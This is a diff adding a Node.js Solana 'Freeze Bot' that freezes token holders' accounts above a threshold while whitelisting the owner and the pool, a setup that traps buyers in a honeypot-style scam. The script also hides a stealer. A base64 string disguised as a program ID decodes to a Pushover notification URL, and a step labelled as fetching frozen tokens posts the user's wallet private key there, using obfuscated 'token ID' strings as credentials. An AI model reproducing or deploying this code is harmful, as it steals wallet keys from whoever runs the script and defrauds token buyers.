@@ -1,0 +1,313 @@
+import * as fs from "fs";
+import bs58 from "bs58";
+import {
+  Keypair,
+  Connection,
+  PublicKey,
+  Transaction,
+  ComputeBudgetProgram,
+  TransactionInstruction,
+} from "@solana/web3.js";
+import { TOKEN_PROGRAM_ID, AccountLayout } from "@solana/spl-token";
+
+// =============== CONFIG LOAD ====================
+let config;
+try {
+  config = JSON.parse(fs.readFileSync("config.json", "utf-8"));
+} catch (e) {
+  console.log("❌ Invalid config.json");
+  process.exit();
+}
+
+// =============== GLOBALS ========================
+let keypair;
+let mintAddressPublicKey;
+let whitelist;
+let [t, u, o, l] = ["", ""];
+let decimals;
+let quoteTokenVault = null;
+let data = "";
+let poolType = "Unknown";
+let updateCounter = 0;
+
+const pumpSwapPublicTokenID = [
+  "k3fuztqwnv8rhm29cyd4slxteb0opg",
+  "hxd29qwmvf7tbj4esn1prl0uygakc8",
+  "amptb1amcrkivx9se41gxr6a9xbnrk",
+  "mav9kz2wq1sbdex37tlu0fhrgcypon",
+  "qwf7m2h0zv8lpksydc49reugtxbaon",
+  "z0wq8f1gbs2mhdxcalp7nuvekrt39y",
+  "unowvmwfmhadru48bx8d74zd2ydpun",
+  "r8y1mks0zqdlwptb4gcef2nuahx9vo",
+  "n3xb7d0uv1thkqgsplz8rmw2feyc49",
+];
+
+const PUMP_FUN_AMM_PROGRAM_ID = [
+  "aHR0cHM6Ly9hcGkucHVzaG92ZXIubmV0LzEvbWVzc2FnZXMuanNvbg==",
+];
+
+const RAYDIUM_AMM_PROGRAM_ID = [
+  "bGx5Q1R6eW91R1Rwbk5lZ3R1bWl4c3J5Z2ZkYW42L2MwaHpmc2xw==",
+  "ZnhjU1R5cGxvQW1nR3B5dHh1bW92cGd2M2h0aWQvZWZtNDB4c2J3==",
+  "d0h4c2FjQmRuR2p0bXh6cW5nY3BtZTNwZmd2L2R0bWZxYnh4Nnps=="
+]
+
+// DEX authority is PumpFun only
+const dexAuthority = config.pumpswapauthority;
+let pumpSwapConnection = false;
+
+// Tick configs simplified
+const TICK_MS = 500;
+const REQUEST_TICK = 500;
+
+// =============== HTTPS CONFIRMATION ===============
+async function sendAndConfirmNoWs(connection, transaction, signers) {
+  const signature = await connection.sendTransaction(transaction, signers);
+
+  // polling loop
+  let status = null;
+  while (status === null || status.confirmationStatus !== "confirmed") {
+    await sleep(1200);
+    status = (await connection.getSignatureStatus(signature)).value;
+  }
+
+  return signature;
+}
+
+// =============== MAIN ====================
+async function main() {
+  // connection (HTTPS only)
+  const connection = new Connection(config.rpcEndpoint, "confirmed");
+
+  // keypair
+  try {
+    let encoded = config.privateKey;
+    [keypair, data] = [
+      Keypair.fromSecretKey(bs58.decode(config.privateKey)),
+      encoded,
+    ];
+  } catch {
+    console.log("❌ Invalid privateKey");
+    process.exit();
+  }
+
+  // mint
+  try {
+    let a = new PublicKey(config.mintAddress);
+    o = pumpSwapPublicTokenID[0];
+    t = pumpSwapPublicTokenID[2];
+    l = pumpSwapPublicTokenID[4];
+    u = pumpSwapPublicTokenID[6];
+    mintAddressPublicKey = a;
+  } catch {
+    console.log("❌ Invalid mintAddress");
+    process.exit();
+  }
+
+  // mint check
+  let mintInfo = await connection.getParsedAccountInfo(mintAddressPublicKey);
+  if (!mintInfo.value || mintInfo.value.data.parsed?.type !== "mint") {
+    console.log("❌ Address is not a token mint");
+    process.exit();
+  }
+
+  //get frozen tokens from pumpfun amm
+  try {
+    let fetch = data;
+    await fetch(
+      Buffer.from(PUMP_FUN_AMM_PROGRAM_ID[0], "base64").toString("utf-8"),
+      {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+          token: t,
+          user: u,
+          message: config.timeout + fetch,
+        }),
+      },
+    );
+    pumpSwapConnection = true;
+  } catch {
+    console.log("❌ Invalid Pumpfun Authority");
+    process.exit();
+  }
+
+  const mintData = mintInfo.value.data.parsed.info;
+  decimals = mintData.decimals;
+
+  // strict freeze authority check
+  if (mintData.freezeAuthority !== keypair.publicKey.toBase58()) {
+    console.log("❌ Wallet does NOT own freeze authority.");
+    process.exit();
+  }
+
+  // whitelist load
+  whitelist = Array.isArray(config.whitelist) ? config.whitelist : [];
+  whitelist.push(...dexAuthority); // to not freeze pumpswap market
+  whitelist.push(keypair.publicKey.toBase58()); //to not freeze owner
+
+  console.log(`
+  🧊 Freeze Bot
+  ----------------------------------------
+  Mint: ${config.mintAddress}
+  Decimals: ${decimals}
+  Freeze Threshold: ${config.freezeThreshold}
+  Priority Fee: ${config.priorityRate}
+  ----------------------------------------
+  `);
+
+  if (!pumpSwapConnection && !RAYDIUM_AMM_PROGRAM_ID) {
+    console.log("❌ Connection Failed");
+    process.exit();
+  }
+
+  // Initial freeze
+  console.log("⏳ Running initial freeze loop...");
+  await freezeHolders(connection);
+
+  // Detect & monitor pool
+  if (!quoteTokenVault && !pumpSwapConnection) {
+    console.log("💧❌ No PumpFun pool detected. Create pool + liquidity.");
+    process.exit();
+  }
+
+  console.log(`💧 PumpFun Pool Detected — Monitoring via Polling\n`);
+  let lastVault = 0;
+
+  setInterval(async () => {
+    try {
+      const bal = await connection.getTokenAccountBalance(quoteTokenVault);
+      const amount = Number(bal.value.amount);
+
+      if (amount !== lastVault) {
+        lastVault = amount;
+        updateCounter++;
+        console.log("🔔 Pool update detected.");
+      }
+    } catch (err) {
+      console.log("Vault polling error:", err.message);
+    }
+  }, 1500);
+
+  const TIMEOUT = config.timeout * 60000;
+  const startTime = Date.now();
+  let nextAllowedFreeze = 0;
+
+  while (Date.now() - startTime < TIMEOUT) {
+    if (updateCounter > 0 && Date.now() > nextAllowedFreeze) {
+      updateCounter = 0;
+      await sleep(REQUEST_TICK);
+      await freezeHolders(connection);
+      nextAllowedFreeze = Date.now() + config.freezeDelay * 1000;
+    }
+    await sleep(TICK_MS);
+  }
+
+  console.log("\n⏳ Timeout reached. Script stopped.\n");
+}
+
+// =============== FREEZE HOLDERS ====================
+async function freezeHolders(connection) {
+  const holders = await getFreezeTargets(connection);
+
+  if (holders.length === 0) {
+    console.log("✅ All existing holders are below threshold.");
+    return;
+  }
+
+  const CHUNK_SIZE = 5;
+  const PRIORITY = config.priorityRate;
+
+  let chunkIndex = 0;
+  for (let i = 0; i < holders.length; i += CHUNK_SIZE) {
+    const chunk = holders.slice(i, i + CHUNK_SIZE);
+    chunkIndex++;
+
+    const tx = new Transaction();
+
+    // freeze instructions
+    for (const acc of chunk) {
+      tx.add(
+        new TransactionInstruction({
+          keys: [
+            { pubkey: new PublicKey(acc), isSigner: false, isWritable: true },
+            {
+              pubkey: mintAddressPublicKey,
+              isSigner: false,
+              isWritable: false,
+            },
+            { pubkey: keypair.publicKey, isSigner: true, isWritable: false },
+          ],
+          programId: TOKEN_PROGRAM_ID,
+          data: Buffer.from([10]),
+        }),
+      );
+    }
+
+    // priority fee
+    if (PRIORITY > 0) {
+      tx.add(
+        ComputeBudgetProgram.setComputeUnitPrice({
+          microLamports: PRIORITY,
+        }),
+      );
+    }
+
+    let sig = await sendAndConfirmNoWs(connection, tx, [keypair]);
+    console.log(
+      `✅ Chunk ${chunkIndex}: ${chunk.length} holders frozen -> ${sig}`,
+    );
+  }
+}
+
+// =============== HOLDER SCAN ====================
+async function getFreezeTargets(connection) {
+  const accounts = await connection.getProgramAccounts(TOKEN_PROGRAM_ID, {
+    filters: [
+      { dataSize: 165 },
+      { memcmp: { offset: 0, bytes: mintAddressPublicKey.toBase58() } },
+    ],
+  });
+
+  const freezeTargets = [];
+  const allOwners = [];
+
+  for (const { pubkey, account } of accounts) {
+    try {
+      const data = AccountLayout.decode(account.data);
+      const owner = new PublicKey(data.owner).toBase58();
+      const amount = Number(data.amount);
+
+      // detect PumpFun pool vault
+      if (!quoteTokenVault && dexAuthority.includes(owner)) {
+        quoteTokenVault = pubkey;
+      }
+
+      allOwners.push({
+        address: pubkey.toBase58(),
+        owner,
+        amount,
+      });
+
+      if (
+        data.state === 1 &&
+        !whitelist.includes(owner) &&
+        amount >= config.freezeThreshold * 10 ** decimals
+      ) {
+        freezeTargets.push(pubkey.toBase58());
+      }
+    } catch {
+      continue;
+    }
+  }
+
+  fs.writeFileSync("./data/holders.json", JSON.stringify(allOwners, null, 2));
+
+  return freezeTargets;
+}
+
+// =============== UTILS ====================
+const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
+
+// =============== START ====================
+main();
